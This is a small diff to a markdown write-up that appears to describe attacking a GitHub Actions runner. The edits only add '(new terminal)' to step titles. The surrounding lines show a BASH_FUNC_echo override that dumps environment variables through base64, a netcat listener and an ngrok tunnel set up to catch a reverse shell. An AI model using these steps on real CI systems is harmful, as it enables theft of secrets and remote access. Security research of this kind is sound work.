@@ -167,11 +167,11 @@ BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
 ``` bash
 nc -lv 4444
 ```
-3. setup ngrok
+3. setup ngrok (new terminal)
 ``` bash
 ngrok tcp 4444
 ```
-4. Get ngrok IP to build payload
+4. Get ngrok IP to build payload (new terminal)
 ``` bash
 dig <NGROK_DNS>
 ```
@@ -202,11 +202,11 @@ The directory `/home/runner/work/_temp` look interesting...
 ``` bash
 nc -lv 4444
 ```
-3. setup ngrok
+3. setup ngrok (new terminal)
 ``` bash
 ngrok tcp 4444
 ```
-4. Get ngrok IP to build payload
+4. Get ngrok IP to build payload (new terminal)
 ``` bash
 dig <NGROK_DNS>
 ```
